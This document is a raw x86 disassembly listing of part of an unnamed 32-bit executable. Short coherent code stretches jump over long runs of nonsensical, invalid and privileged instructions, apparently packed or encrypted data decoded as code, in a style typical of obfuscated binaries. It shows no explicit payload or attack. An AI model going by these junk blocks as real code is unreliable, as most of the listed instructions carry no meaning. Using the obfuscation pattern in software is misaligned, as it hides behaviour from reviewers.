  406d52:	lea    eax,ds:0x43c278
  406d58:	jmp    0x406e84
  406d5d:	scas   eax,DWORD PTR es:[edi]
  406d5e:	stos   DWORD PTR es:[edi],eax
  406d5f:	fs pop ds
  406d61:	js     0x406d46
  406d63:	addr16 mov ebx,0xcd1c5374
  406d69:	push   ds
  406d6a:	outs   dx,DWORD PTR ds:[esi]
  406d6b:	out    dx,eax
  406d6c:	adc    DWORD PTR [edi*1+0x7f0d7c7c],esi
  406d73:	jl     0x406df1
  406d75:	inc    edi
  406d76:	pop    eax
  406d77:	inc    edx
  406d78:	cmc    
  406d79:	sub    ebp,edi
  406d7b:	inc    ecx
  406d7c:	icebp  
  406d7d:	sub    al,0x4b
  406d7f:	test   eax,0x779e3e27
  406d84:	fcmovb st,st(4)
  406d86:	(bad)  
  406d87:	sbb    edi,DWORD PTR [esi]
  406d89:	ret    0xeeae
  406d8c:	push   esp
  406d8d:	sti    
  406d8e:	repnz retf 
  406d90:	ins    DWORD PTR es:[edi],dx
  406d91:	hlt    
  406d92:	push   ecx
  406d93:	xchg   esp,eax
  406d94:	jp     0x406d72
  406d96:	inc    edi
  406d97:	stc    
  406d98:	das    
  406d99:	adc    ebp,ecx
  406d9b:	in     eax,dx
  406d9c:	in     al,dx
  406d9d:	cmp    ebx,esi
  406d9f:	lods   eax,DWORD PTR ds:[esi]
  406da0:	aam    0xe0
  406da2:	adc    ebp,DWORD PTR [ebp+0x51]
  406da5:	jb     0x406da7
  406da7:	xor    DWORD PTR [ebx+ecx*1],ecx
  406daa:	js     0x406e17
  406dac:	pop    edi
  406dad:	pop    es
  406dae:	jg     0x406df4
  406db0:	sub    eax,0xaf219824
  406db5:	inc    ebp
  406db6:	aaa    
  406db7:	addr16 fwait
  406db9:	cmp    ebx,DWORD PTR [esi+0x39fba511]
  406dbf:	clc    
  406dc0:	adc    cl,BYTE PTR [eax]
  406dc2:	and    eax,DWORD PTR [eax]
  406dc4:	jg     0x406e0e
  406dc6:	test   ch,cl
  406dc8:	or     DWORD PTR [esi+0x5c],eax
  406dcb:	mov    al,ds:0x5b943f4
  406dd0:	shl    DWORD PTR [esi],cl
  406dd2:	and    esp,DWORD PTR [eax]
  406dd4:	mov    ebp,0xbbb2a7fe
  406dd9:	xchg   BYTE PTR [ebx],dh
  406ddb:	std    
  406ddc:	arpl   WORD PTR [ebp-0xc],di
  406ddf:	rcl    BYTE PTR ds:0x6ab83741,0x7a
  406de6:	push   es
  406de7:	add    BYTE PTR [ebx+0x2712fc84],al
  406ded:	arpl   WORD PTR [edi-0x3d66a5eb],si
  406df3:	dec    eax
  406df4:	inc    esp
  406df5:	out    0xe9,al
  406df7:	loope  0x406dc1
  406df9:	cmp    al,0x37
  406dfb:	xchg   edx,eax
  406dfc:	jl     0x406dde
  406dfe:	ja     0x406df5
  406e00:	pop    ax
  406e02:	xchg   ebp,eax
  406e03:	aam    0x6d
  406e05:	fucomip st,st(4)
  406e07:	sub    eax,0x424acd55
  406e0c:	mov    ah,0x29
  406e0e:	ins    DWORD PTR es:[edi],dx
  406e0f:	sub    ecx,eax
  406e11:	loope  0x406dd3
  406e13:	das    
  406e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e15:	js     0x406df2
  406e17:	(bad)
  406e1a:	and    eax,0x29103277
  406e1f:	inc    edx
  406e20:	clc    
  406e21:	or     eax,0x5da5fca9
  406e26:	int3   
  406e27:	repz sar BYTE PTR [esi+eiz*1-0x28],1
  406e2c:	fisttp QWORD PTR [ebx-0x42c967c9]
  406e32:	jmp    FWORD PTR [ecx]
  406e34:	ins    BYTE PTR es:[edi],dx
  406e35:	mov    esi,0x6d47d76b
  406e3a:	push   ss
  406e3b:	jmp    0x37231d69
  406e40:	dec    ecx
  406e41:	out    dx,al
  406e42:	pop    eax
  406e43:	jp     0x406e9e
  406e45:	imul   esp,DWORD PTR [esi+edi*2],0x3f
  406e49:	fist   DWORD PTR [esi+0x222b64d2]
  406e4f:	ret    
  406e50:	or     cl,BYTE PTR [ebx-0x3e]
  406e53:	lods   eax,DWORD PTR ds:[esi]
  406e54:	adc    eax,DWORD PTR [edi+ebp*8-0x1]
  406e58:	fwait
  406e59:	sub    dh,BYTE PTR [ecx+ebp*8+0x272c29cd]
  406e60:	ja     0x406e92
  406e62:	lods   al,BYTE PTR ds:[esi]
  406e63:	inc    edx
  406e64:	or     ch,BYTE PTR [edx]
  406e66:	stos   BYTE PTR es:[edi],al
  406e67:	in     eax,dx
  406e68:	ror    ebp,1
  406e6a:	mov    DWORD PTR [esi+ebp*8+0xbdbad8e],edx
  406e71:	aas    
  406e72:	fmul   DWORD PTR [edx+0x59]
  406e75:	enter  0xcd1b,0xe2
  406e79:	add    bl,BYTE PTR ds:0x861057ca
  406e7f:	or     ch,BYTE PTR [ecx-0x674425]
  406e85:	xor    BYTE PTR [ebp+0x43c02405],cl
  406e8b:	add    bh,bh
  406e8d:	xor    BYTE PTR [ebp+0x43c25805],cl
  406e93:	add    bh,bh
  406e95:	xor    BYTE PTR [ebp+0x43c34805],cl
  406e9b:	add    bh,bh
  406e9d:	xor    BYTE PTR [edi-0x16bcbc2d],al
  406ea3:	daa    
  406ea4:	add    DWORD PTR [eax],eax
  406ea6:	add    BYTE PTR [ecx],bl
  406ea8:	retf   
  406ea9:	mov    ecx,0xd9627d6c
  406eae:	ins    DWORD PTR es:[edi],dx
  406eaf:	lods   al,BYTE PTR ds:[esi]
  406eb0:	test   eax,0xc4e77590
  406eb5:	iret   
  406eb6:	daa    
  406eb7:	lds    edi,FWORD PTR [esp+edi*2]
  406eba:	jl     0x406ec9
  406ebc:	jg     0x406f3a
  406ebe:	jl     0x406eb2
  406ec0:	out    dx,eax
  406ec1:	in     eax,0x4b
  406ec3:	cmp    edx,DWORD PTR [edi-0xa332c53]
  406ec9:	xchg   ecx,eax
  406eca:	mov    cl,0x70
  406ecc:	push   0xffffffb0
  406ece:	stos   DWORD PTR es:[edi],eax
  406ecf:	mov    al,ds:0xe307a28a
  406ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ed5:	repz fist WORD PTR [esi+0x7f1754be]
  406edc:	fldcw  WORD PTR [ecx-0x2ca1279]
  406ee2:	dec    ebx
  406ee3:	add    al,0x6b
  406ee5:	xchg   DWORD PTR [ebx+eiz*8],ecx
  406ee8:	sti    
  406ee9:	imul   edi,DWORD PTR [eax+0x0],0x3030547c
  406ef0:	or     ebx,DWORD PTR [edx-0xa]
  406ef3:	aam    0x1
  406ef5:	xchg   edx,eax
  406ef6:	adc    edx,edx
  406ef8:	xor    BYTE PTR [ecx+ebp*1],dl
  406efb:	pop    edx
  406efc:	iret   
  406efd:	jp     0x406f24
  406eff:	out    0x82,eax
  406f01:	mov    eax,ds:0x7c2b2104
  406f06:	xchg   BYTE PTR [ebx-0x71a889e4],cl
  406f0c:	in     eax,0x4e
  406f0e:	rcr    DWORD PTR [esi],cl
  406f10:	ja     0x406f11
  406f12:	imul   ebx,DWORD PTR [eax+0xb],0x29ff39fa
  406f19:	sub    esp,esp
  406f1b:	es test dl,ah
  406f1e:	dec    edx
  406f1f:	sbb    ebp,DWORD PTR [ebx+0x6809f0e9]
  406f25:	repnz or DWORD PTR ds:0xc6d25b59,esi
  406f2c:	mov    ch,0x34
  406f2e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  406f30:	in     eax,dx
  406f31:	rcl    BYTE PTR [eax+0x18],cl
  406f34:	or     eax,0x2b0cc6be
  406f39:	xchg   edi,eax
  406f3a:	adc    bl,bl
  406f3c:	mov    ebp,0x7792d201
  406f41:	or     ch,bh
  406f43:	hlt    
  406f44:	aam    0xca
  406f46:	setbe  BYTE PTR [edi+0x749a4db]
  406f4d:	sub    al,0xd1
  406f4f:	loope  0x406f0f
  406f51:	mov    eax,ds:0xe52f7d70
  406f56:	popf   
  406f57:	mov    ds:0xe523d162,al
  406f5c:	aas    
  406f5d:	test   DWORD PTR [ebp+0x26],esp
  406f60:	es in  eax,0xef
  406f63:	mov    WORD PTR [edx+0x163f916f],es
  406f69:	cmp    al,0x51
  406f6b:	mov    gs,ecx
  406f6d:	xchg   edi,eax
  406f6e:	xor    DWORD PTR [edx-0x3],0x25194893
  406f75:	sbb    ecx,ebx
  406f77:	call   0xc1379879
  406f7c:	or     edx,edi
  406f7e:	(bad)  
  406f7f:	ficomp DWORD PTR [edi+ebp*1]
  406f82:	dec    edi
  406f83:	sub    edi,DWORD PTR [eax+ebp*2+0x56cc9b25]
  406f8a:	stos   BYTE PTR es:[edi],al
  406f8b:	je     0x406f57
  406f8d:	jne    0x406fca
  406f8f:	mov    al,ds:0xa9eadd8f
  406f94:	fwait
  406f95:	mov    edx,0x70ef2e1
  406f9a:	sub    BYTE PTR [eax-0x7cd0d3c1],dl
  406fa0:	cmp    BYTE PTR [ecx+0x3c15fb45],bh
  406fa6:	adc    edx,eax
  406fa8:	jae    0x406f83
  406faa:	xchg   BYTE PTR [ebp+0x69756a7a],ah
  406fb0:	lds    eax,FWORD PTR [esi-0x59c3b050]
  406fb6:	(bad)  
  406fb7:	pop    ebx
  406fb8:	add    DWORD PTR [ebp+0x6f612a23],ecx
  406fbe:	idiv   DWORD PTR [ebp+edi*1+0x3bb2a2b1]
  406fc5:	out    0x90,al
  406fc7:	xor    al,0x4a
  406fc9:	mov    ebx,0x1462be84
  406fce:	sub    ebx,0x3
  406fd1:	push   ebx
  406fd2:	pop    eax
  406fd3:	call   DWORD PTR [eax+0x1]
  406fd6:	mov    eax,DWORD PTR [ebp-0x20]
  406fd9:	mov    ecx,DWORD PTR ds:0x43c21c
  406fdf:	jmp    0x40710b
  406fe4:	gs jg  0x406fc0
  406fe7:	add    DWORD PTR [ebp-0x27],edi
  406fea:	jge    0x40703f
  406fec:	jecxz  0x406fd1
  406fee:	stos   DWORD PTR es:[edi],eax
  406fef:	ins    BYTE PTR es:[edi],dx
  406ff0:	mov    ebp,0xd2820728
  406ff5:	aas    
  406ff6:	jl     0x407074
  406ff8:	or     eax,0xd37c7c7f
  406ffd:	adc    edx,esi
  406fff:	dec    eax
  407000:	into   
  407001:	jle    0x407008
  407003:	pop    edi
  407004:	lds    ecx,FWORD PTR [eax]
  407006:	jle    0x40702f
  407008:	mov    dl,0x74
  40700a:	mov    bl,0xb0
  40700c:	adc    eax,0xa68e5c75
  407011:	add    eax,0x83f22748
  407016:	inc    esi
  407017:	sbb    al,0xb4
  407019:	mov    ?,esp
  40701b:	mov    al,0xa9
  40701d:	popa   
  40701e:	leave  
  40701f:	cmp    al,0x92
  407021:	jo     0x40708c
  407023:	adc    bl,bh
  407025:	cmp    al,0xda
  407027:	test   al,0x66
  407029:	pop    eax
  40702a:	sbb    edx,eax
  40702c:	in     al,dx
  40702d:	out    0xc7,eax
  40702f:	stc    
  407030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407031:	addr16 xchg edx,eax
  407033:	ins    BYTE PTR es:[edi],dx
  407034:	push   cs
  407035:	sbb    eax,0x9ae20df5
  40703a:	mov    esp,0xaaed974d
  40703f:	sbb    DWORD PTR [ebp-0x2],ebx
  407042:	nop
  407043:	push   cs
  407044:	jne    0x40706d
  407046:	mov    dh,0xc9
  407048:	int    0xc1
  40704a:	retf   
  40704b:	in     eax,dx
  40704c:	(bad)  
  40704d:	cmp    BYTE PTR [edx],dh
  40704f:	xor    al,0x7f
  407051:	xchg   esp,eax
  407052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407053:	cmp    al,0x99
  407055:	jb     0x406ffe
  407057:	adc    eax,0xb6214eff
  40705c:	imul   edx,DWORD PTR [eax],0xd9bfb29b
  407062:	shr    BYTE PTR [ecx-0x78b4d1ec],0xa1
  407069:	and    BYTE PTR [eax-0x46f8af2b],bl
  40706f:	or     edi,0xffffff81
  407072:	jl     0x406ffe
  407074:	mov    edi,0xdab6d99
  407079:	arpl   di,cx
  40707b:	iret   
  40707c:	das    
  40707d:	call   0x5aff:0xa42e41c1
  407084:	push   edi
  407085:	shr    esi,0xd
  407088:	retf   0xac4a
  40708b:	cmp    eax,0xc3aae1e8
  407090:	leave  
  407091:	sub    eax,0x28fe7805
  407096:	mov    esi,0xc0d5609e
  40709b:	test   al,cl
  40709d:	call   0x309a9750
  4070a2:	xchg   ebp,eax
  4070a3:	lahf   
  4070a4:	cmp    ch,BYTE PTR [edx-0x22]
  4070a7:	sbb    eax,0x6a5bcecb
  4070ac:	jb     0x407129
  4070ae:	jno    0x4070d8
  4070b0:	pop    esi
  4070b1:	adc    bl,dl
  4070b3:	outs   dx,DWORD PTR ds:[esi]
  4070b4:	test   BYTE PTR [edx+ecx*1+0x23],dh
  4070b8:	ins    DWORD PTR es:[edi],dx
  4070b9:	pop    esi
  4070ba:	lea    eax,[edx]
  4070bc:	mov    eax,0xb1255424
  4070c1:	daa    
  4070c2:	div    DWORD PTR [ecx]
  4070c4:	daa    
  4070c5:	in     al,dx
  4070c6:	sbb    bh,cl
  4070c8:	sub    ecx,DWORD PTR [edx]
  4070ca:	and    dh,cl
  4070cc:	pop    eax
  4070cd:	inc    esp
  4070ce:	mov    cl,0xb9
  4070d0:	clc    
  4070d1:	mov    al,0x2e
  4070d3:	inc    esp
  4070d4:	adc    DWORD PTR ds:0x21733c5c,edx
  4070da:	and    esp,ecx
  4070dc:	jbe    0x40708f
  4070de:	pop    edi
  4070df:	push   edx
  4070e0:	pop    ebx
  4070e1:	pushf  
  4070e2:	dec    edi
  4070e3:	adc    BYTE PTR [edi+0x7e379617],ah
  4070e9:	xchg   DWORD PTR [ebp-0x44],ebx
  4070ec:	in     al,dx
  4070ed:	retf   
  4070ee:	sar    BYTE PTR [ecx+0x60],1
  4070f1:	sbb    ecx,DWORD PTR [ebx-0x62ba50b1]
  4070f7:	xchg   esp,eax
  4070f8:	push   ebx
  4070f9:	pop    edx
  4070fa:	mov    bh,0xec
  4070fc:	adc    al,0x27
  4070fe:	mov    ebx,0xdf8fe7f
  407103:	fwait
  407104:	dec    eax
  407105:	bound  ebp,QWORD PTR [ebx]
  407107:	fld    DWORD PTR [edx+0x8010812]
  40710d:	pop    edi
  40710e:	pop    esi
  40710f:	pop    ebx
  407110:	leave  
  407111:	ret    
  407112:	push   ebp
  407113:	mov    ebp,esp
  407115:	sub    esp,0x2c
  407118:	xor    eax,0x6ce
  40711d:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  407124:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40712b:	or     DWORD PTR ds:0x44536c,0x5a5
  407135:	jmp    0x40726c
  40713a:	push   ds
  40713b:	repz lock adc al,0x95
  40713f:	pop    ss
  407140:	stos   BYTE PTR es:[edi],al
  407141:	lea    edi,[esi+0x16]
  407144:	nop
  407145:	push   ebx
  407146:	dec    eax
  407147:	inc    edi
  407148:	or     al,0x30
  40714a:	jecxz  0x40718a
  40714c:	jl     0x4071ca
  40714e:	push   es
  40714f:	jg     0x4071cd
  407151:	jl     0x4071cd
  407153:	mov    ds:0xc4cb4598,eax
  407158:	stc    
  407159:	ins    DWORD PTR es:[edi],dx
  40715a:	lahf   
  40715b:	push   esp
  40715c:	jae    0x4071b1
  40715e:	xchg   edx,eax
  40715f:	sub    cl,bh
  407161:	add    ah,ah
  407163:	stc    
  407164:	into   
  407165:	ins    DWORD PTR es:[edi],dx
  407166:	out    0x15,al
  407168:	xor    BYTE PTR [ebx+0x18],al
  40716b:	mov    ebx,0x25308cad
  407170:	icebp  
  407171:	mov    dl,0x4d
  407173:	bound  ebx,QWORD PTR [ebx-0x7fffe686]
  407179:	jge    0x4071f5
  40717b:	pop    esi
  40717c:	in     al,0x60
  40717e:	push   cs
  40717f:	inc    edi
  407180:	sub    edx,esi
  407182:	inc    eax
  407183:	hlt    
  407184:	mov    eax,ds:0x1c11449a
  407189:	arpl   WORD PTR [eax-0x49],ax
  40718c:	xor    al,BYTE PTR [ebp-0x60]
  40718f:	out    0x4e,eax
  407191:	fild   DWORD PTR [edi]
  407193:	fnsave [ebx-0x7d]
  407196:	leave  
  407197:	dec    eax
  407198:	in     al,dx
  407199:	mov    esi,0x4b7d9821
  40719e:	imul   esp,DWORD PTR [ecx],0x4b3a7274
  4071a4:	pop    edi
  4071a5:	imul   ebx,DWORD PTR [ecx*8+0x6d85d907],0x45
  4071ad:	lea    eax,[esi]
  4071af:	xor    ecx,0xeaea7eb2
  4071b5:	imul   eax,DWORD PTR ds:0xd2ef3bf6,0x6e
  4071bc:	jg     0x40722a
  4071be:	adc    eax,0x6e141d34
  4071c3:	jl     0x407150
  4071c5:	in     al,dx
  4071c6:	je     0x4071a7
  4071c8:	sub    eax,0x45c43905
  4071cd:	fstp   QWORD PTR [edi+0x79]
  4071d0:	ret    0xf632
  4071d3:	jl     0x4071ba
  4071d5:	add    DWORD PTR [edi],0x33e3c229
  4071db:	and    DWORD PTR [ebp-0x74f64476],ebp
  4071e1:	push   cs
  4071e2:	popa   
  4071e3:	shl    DWORD PTR [ecx],cl
  4071e5:	jbe    0x407205
  4071e7:	cmp    DWORD PTR [ebp+0x14],esp
  4071ea:	jg     0x4071d1
  4071ec:	add    BYTE PTR [edx+0x13],ch
  4071ef:	inc    ecx
  4071f0:	js     0x407252
  4071f2:	xchg   esp,eax
  4071f3:	xchg   ebp,eax
  4071f4:	xchg   edx,eax
  4071f5:	hlt    
  4071f6:	xchg   edx,eax
  4071f7:	dec    esp
  4071f8:	outs   dx,BYTE PTR ds:[esi]
  4071f9:	add    ebp,ecx
  4071fb:	imul   ch
  4071fd:	mov    edi,0xe59c4151
  407202:	test   ah,ah
  407204:	jnp    0x407275
  407206:	in     eax,0x59
  407208:	mov    bl,0xb0
  40720a:	aaa    
  40720b:	int3   
  40720c:	ins    DWORD PTR es:[edi],dx
  40720d:	mov    WORD PTR ds:0xa6b8179f,?
  407213:	and    eax,0x706317d4
  407218:	adc    dl,bh
  40721a:	xchg   ebx,eax
  40721b:	lea    esi,[edx+0x7b]
  40721e:	fiadd  DWORD PTR [edx]
  407220:	cmp    esp,DWORD PTR [edi-0x76723eda]
  407226:	mov    eax,ds:0x36bad9d4
  40722b:	retf   0x6268
  40722e:	scas   eax,DWORD PTR es:[edi]
  40722f:	pop    eax
  407230:	ret    
  407231:	(bad)
  407234:	fiadd  DWORD PTR [ecx]
  407236:	ret    0xa8cb
  407239:	mov    ch,0xb1
  40723b:	sub    esp,DWORD PTR [edi-0x7b949a00]
  407241:	je     0x407258
  407243:	retf   0xa546
  407246:	aaa    
  407247:	arpl   WORD PTR [eax+0x31],sp
  40724a:	sub    cl,BYTE PTR [edi+0x1c]
  40724d:	cli    
  40724e:	arpl   WORD PTR [ecx-0x2a],di
  407251:	fwait
  407252:	mov    dh,0x86
  407254:	mov    bx,di
  407257:	add    ebp,DWORD PTR [edx-0x5e]
  40725a:	dec    edx
  40725b:	cld    
  40725c:	repz pop ebp
  40725e:	push   0x43eb69c6
  407263:	push   edx
  407264:	scas   al,BYTE PTR es:[edi]
  407265:	loop   0x407265
  407267:	and    ecx,esp
  407269:	jmp    0x95:0x7b81021
  407270:	add    BYTE PTR [ecx+0x4105cf25],al
  407276:	add    BYTE PTR [eax],al
  407278:	add    BYTE PTR [eax],al
  40727a:	add    BYTE PTR [ebx+0x4105cf0d],cl
  407280:	add    BYTE PTR [ecx-0x77],al
  407283:	or     eax,0x4105cf
  407288:	cmp    DWORD PTR ds:0x4105cf,0x20
  40728f:	jne    0x4072a0
  407295:	push   0x413412
  40729a:	call   DWORD PTR ds:0x43c84c
  4072a0:	cmp    DWORD PTR ds:0x4105cf,0x10
  4072a7:	jb     0x40727b
  4072ad:	or     DWORD PTR ds:0x4427b4,0x61e1
  4072b7:	mov    WORD PTR [ebp-0x4],ax
  4072bb:	xor    DWORD PTR ds:0x4427b8,0xdd9
  4072c5:	lea    eax,[ebp-0x24]
  4072c8:	and    ecx,DWORD PTR ds:0x4427b0
  4072ce:	jmp    0x407405
  4072d3:	div    DWORD PTR [eax]
  4072d5:	test   BYTE PTR [ebx],ah
  4072d7:	pop    ebx
  4072d8:	jnp    0x407285
  4072da:	js     0x407349
  4072dc:	ds xchg ebx,eax
  4072de:	mov    esp,0x1d9e0ea6
  4072e3:	lea    esi,[ecx]
  4072e5:	jl     0x407363
  4072e7:	push   es
  4072e8:	jg     0x407366
  4072ea:	jl     0x4072e1
  4072ec:	lock jge 0x407277
  4072ef:	clc    
  4072f0:	sbb    BYTE PTR [eax-0x39],dh
  4072f3:	int3   
  4072f4:	rcl    BYTE PTR [edi+eiz*4],1
  4072f7:	inc    esp
  4072f8:	push   es
  4072f9:	inc    ebx
  4072fa:	sub    dh,BYTE PTR [ebx-0x2cc6c617]
  407300:	iret   
  407301:	and    esi,ebx
  407303:	(bad)  
  407304:	sub    eax,0x789f7a20
  407309:	mov    ds:0xc205ca8d,eax
  40730e:	cmp    DWORD PTR [eax+0x5ea22ef7],ebx
  407314:	pop    esi
  407315:	std    
  407316:	into   
  407317:	xchg   DWORD PTR [esi+edx*8],edx
  40731a:	nop
  40731b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40731c:	loope  0x40733a
  40731e:	jno    0x407322
  407320:	jbe    0x4072b1
  407322:	inc    ebp
  407323:	adc    ebx,DWORD PTR [ebp-0x547186b4]
  407329:	mov    ch,0x4b
  40732b:	lods   eax,DWORD PTR ds:[esi]
  40732c:	mov    edi,fs
  40732e:	fimul  WORD PTR [esp+esi*4]
  407331:	push   0xffffffd2
  407333:	ret    0x9fc
  407336:	call   0xc8fd21d2
  40733b:	test   BYTE PTR [eax],cl
  40733d:	sbb    ah,BYTE PTR [ecx-0x39]
  407340:	lock jne 0x407373
  407343:	lock cmp ebx,0x3f
  407347:	retf   
  407348:	mov    eax,ds:0x4a76c34d
  40734d:	out    0xe2,al
  40734f:	sub    ch,BYTE PTR [edi-0x3db23470]
  407355:	jne    0x407326
  407357:	enter  0xa636,0xf9
  40735b:	ret    0x9ccb
  40735e:	dec    ecx
  40735f:	stos   BYTE PTR es:[edi],al
  407360:	adc    ah,bl
  407362:	mov    cl,0x32
  407364:	sbb    BYTE PTR [ebx+ebp*1-0x4e],dh
  407368:	mov    eax,0xb9e5a876
  40736d:	out    dx,al
  40736e:	cmp    eax,ebp
  407370:	arpl   WORD PTR [ebp+0x65],bp
  407373:	outs   dx,BYTE PTR ds:[esi]
  407374:	repnz cld 
  407376:	leave  
  407377:	cwde   
  407378:	mov    BYTE PTR ds:0x9fb5a0f1,bl
  40737e:	arpl   WORD PTR [esi],ax
  407380:	push   esp
  407381:	out    0xc4,al
  407383:	or     dl,0x14
  407386:	rol    bl,0xa5
  407389:	pushf  
  40738a:	push   ebp
  40738b:	cmp    eax,0xcc48f6de
  407390:	jae    0x407354
  407392:	(bad)  
  407393:	data16 aaa 
  407395:	cwde   
  407396:	addr16 adc al,0xdc
  407399:	mov    eax,ds:0x5de704a4
  40739e:	test   dl,bl
  4073a0:	pushf  
  4073a1:	inc    esp
  4073a2:	dec    esi
  4073a3:	leave  
  4073a4:	fs je  0x40735f
  4073a7:	mov    eax,ds:0x3b44ce86
  4073ac:	pop    eax
  4073ad:	and    ebp,DWORD PTR [edi-0x49]
  4073b0:	pop    ebp
  4073b1:	push   0xffffffb0
  4073b3:	pop    es
  4073b4:	xchg   edx,eax
  4073b5:	mov    ds:0x91b126c9,al
  4073ba:	daa    
  4073bb:	pop    esi
  4073bc:	sbb    BYTE PTR [eax+0x78557ac2],0x1
  4073c3:	mov    ebx,DWORD PTR [ebx+edi*4-0x6501355d]
  4073ca:	cwde   
  4073cb:	fmul   DWORD PTR [eax+0x34]
  4073ce:	test   bh,bl
  4073d0:	js     0x40738b
  4073d2:	(bad)  
  4073d3:	iret   
  4073d4:	push   edi
  4073d5:	fimul  WORD PTR [eax-0x39b1facb]
  4073db:	cmp    esp,DWORD PTR [eax+0x142f1541]
  4073e1:	pop    eax
  4073e2:	popa   
  4073e3:	sbb    ah,al
  4073e5:	push   cs
  4073e6:	sbb    DWORD PTR [esi-0x47],esp
  4073e9:	std    
  4073ea:	mov    ebp,0x147f0552
  4073ef:	sub    dl,BYTE PTR [ebp+0x72]
  4073f2:	or     edx,ebx
  4073f4:	push   edi
  4073f5:	xor    esi,ecx
  4073f7:	(bad)  
  4073f8:	stc    
  4073f9:	clc    
  4073fa:	imul   ebx,DWORD PTR ds:0xd91fcbe7,0xffffffd7
  407401:	mov    al,0x5
  407403:	clc    
  407404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407405:	mov    DWORD PTR [ebp-0x28],eax
  407408:	jmp    0x40753f
  40740d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40740e:	(bad)  [ecx+0x67666966]
  407414:	fld    DWORD PTR [edx]
  407416:	xor    eax,0x7a7cc56
  40741b:	pop    edi
  40741c:	leave  
  40741d:	xchg   edi,eax
  40741e:	xor    BYTE PTR [esp+edi*2+0x6],bh
  407422:	jg     0x4074a0
  407424:	jl     0x407490
  407426:	leave  
  407427:	xchg   edx,eax
  407428:	mov    bh,0x56
  40742a:	inc    ebp
  40742b:	lea    ebx,[ebp+0x3fcb349c]
  407431:	adc    BYTE PTR [ebx+0x55],al
  407434:	xor    eax,0x67274c04
  407439:	fist   DWORD PTR [ebx+0x64]
  40743c:	test   eax,edx
  40743e:	xor    al,0x3
  407440:	ror    BYTE PTR [esi-0x518f8a2e],1
  407446:	push   edi
  407447:	test   DWORD PTR [esi-0x3a],ebx
  40744a:	add    ebp,DWORD PTR [eax]
  40744c:	adc    esp,DWORD PTR [ebx-0x138aa1ff]
  407452:	lahf   
  407453:	nop
  407454:	out    dx,al
  407455:	or     BYTE PTR [edi+esi*2+0x7bc0abb7],ah
  40745c:	(bad)  
  40745d:	cmp    eax,0x3fdebc4b
  407462:	rcl    BYTE PTR [ebp-0x44],0xee
  407466:	and    dh,dh
  407468:	das    
  407469:	xor    ch,BYTE PTR [edi+eax*4]
  40746c:	icebp  
  40746d:	xchg   cl,al
  40746f:	ret    
  407470:	(bad)  [ebx]
  407472:	xchg   ebp,eax
  407473:	fwait
  407474:	cmp    eax,0xf98045bf
  407479:	and    eax,0xedb4b692
  40747e:	vpcmpeqb ymm5,ymm6,YMMWORD PTR [ecx]
  407482:	mov    bh,0xd0
  407484:	add    dl,BYTE PTR [ecx+ecx*1]
  407487:	lods   al,BYTE PTR ds:[esi]
  407488:	icebp  
  407489:	xor    DWORD PTR [esi+ebp*4-0x57],edx
  40748d:	jne    0x407448
  40748f:	js     0x4074c4
  407491:	je     0x4074e9
  407493:	in     al,dx
  407494:	cdq    
  407495:	jge    0x407479
  407497:	out    dx,al
  407498:	mov    cl,0xb1
  40749a:	lods   al,BYTE PTR ds:[esi]
  40749b:	fiadd  WORD PTR [esi]
  40749d:	ss pop eax
  40749f:	sbb    DWORD PTR [ecx],0xfffffff6
  4074a2:	aaa    
  4074a3:	mov    bl,0xf2
  4074a5:	out    dx,eax
  4074a6:	out    dx,eax
  4074a7:	inc    ebx
  4074a8:	adc    al,0x41
  4074aa:	sub    ah,BYTE PTR [esi+0x60a22a37]
  4074b0:	(bad)  
  4074b1:	mov    dl,0xc1
  4074b3:	neg    BYTE PTR [eax-0x3e1cc413]
  4074b9:	sbb    esi,DWORD PTR [ecx-0x4a]
  4074bc:	mov    ebp,DWORD PTR [esp+edx*4+0x35ed088a]
  4074c3:	fs out dx,eax
  4074c5:	(bad)  
  4074c6:	fwait
  4074c7:	adc    DWORD PTR [ebp-0x25],esp
  4074ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074cb:	inc    ecx
  4074cc:	les    edx,FWORD PTR [edx]
  4074ce:	(bad)  
  4074cf:	or     BYTE PTR [esp+edx*2-0x78ca2426],bl
  4074d6:	jp     0x407480
  4074d8:	adc    BYTE PTR fs:[eax-0x6b],0xae
  4074dd:	aaa    
  4074de:	je     0x4074cf
  4074e0:	mov    ch,0xf8
  4074e2:	sub    eax,0xfe2ce738
  4074e7:	pop    eax
  4074e8:	fdivr  QWORD PTR [esi+0x57]
  4074eb:	outs   dx,BYTE PTR ds:[esi]
  4074ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074ed:	loop   0x407547
  4074ef:	sub    al,0x1c
  4074f1:	outs   dx,DWORD PTR ds:[esi]
  4074f2:	xor    BYTE PTR [esi+eiz*1-0x30],bh
  4074f6:	lods   eax,DWORD PTR ds:[esi]
  4074f7:	jecxz  0x40747f
  4074f9:	add    eax,0xf38ca0f5
  4074fe:	fs push esp
  407500:	push   ds
  407501:	adc    DWORD PTR [eax+0x56],eax
  407504:	pop    edx
  407505:	out    dx,al
  407506:	sbb    DWORD PTR [esi+0x321f841e],edx
  40750c:	out    0x96,eax
  40750e:	call   0xb70bb19c
  407513:	rcl    cl,0xf2
  407516:	adc    ah,BYTE PTR [esi]
  407518:	retf   
  407519:	cwde   
  40751a:	mov    edx,0x5c0909de
  40751f:	in     eax,dx
  407520:	ins    DWORD PTR es:[edi],dx
  407521:	inc    esi
  407522:	jge    0x40756b
  407524:	mov    cl,0x68
  407526:	fistp  DWORD PTR [edi-0x29c01ac6]
  40752c:	shl    BYTE PTR [ecx+0x35],0x88
  407530:	lds    esi,FWORD PTR [ebx]
  407532:	adc    DWORD PTR [edi-0x53],esp
  407535:	pop    ecx
  407536:	inc    edi
  407537:	imul   ebp,edx,0x73
  40753a:	jne    0x407539
  40753c:	pop    esp
  40753d:	nop
  40753e:	mov    eax,DWORD PTR gs:[ebp+0x8]
  407542:	add    ecx,DWORD PTR ds:0x4427b8
  407548:	mov    DWORD PTR [ebp-0x20],eax
  40754b:	sbb    ecx,0x41ef
  407551:	push   ebx
